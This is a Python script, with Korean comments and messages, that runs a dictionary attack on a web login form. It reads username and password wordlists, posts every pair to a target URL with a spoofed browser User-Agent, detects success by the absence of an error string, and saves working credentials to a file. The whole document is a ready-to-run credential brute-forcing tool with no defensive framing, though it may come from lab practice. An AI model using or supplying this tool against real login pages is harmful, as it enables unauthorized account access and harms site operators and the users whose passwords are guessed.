#!/usr/bin/env python3
#-*- coding: utf-8 -*-

import requests
from os import path, sys

# 타겟 사이트의 url을 입력하세요. (ex http://192.168.161.138/test/login.php)
url = ""
dir_path = path.dirname(__file__)
headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36"
}

id_file = "userIdDictionary.txt"
pw_file = "userPwDictionary.txt"

try:
    username = open(id_file,"r")
except FileNotFoundError:
    print("[!] {} 경로에 ID 사전 파일이 존재하지 않습니다.".format(dir_path))
    sys.exit(1)
else:
    users = username.read().split("\n")
    username.close()

try:
    password = open(pw_file,"r")
except FileNotFoundError:
    print("[!] {} 경로에 PW 사전 파일이 존재하지 않습니다.".format(dir_path))
    sys.exit(1)
else:
    pws = password.read().split("\n")
    password.close()

print("[!] Dictionary Attack Start...\n")
for user in users:
    for pw in pws:
        print("[+] Trying {} | {}".format(user,pw))
        query = {
            "username" : user,
            "password" : pw,
            "submit" : ""
        }
        response = requests.post(url, data=query, headers=headers)

        if("Wrong username or password" not in response.text):
            print("[!] Login Success!")
            print("-> ID : {} | PW : {}".format(user,pw))
            login_ok = open("login_ok.txt","a")
            login_ok.write(user+"\t"+pw+"\n")
            login_ok.close()
print("[!] Complete...")
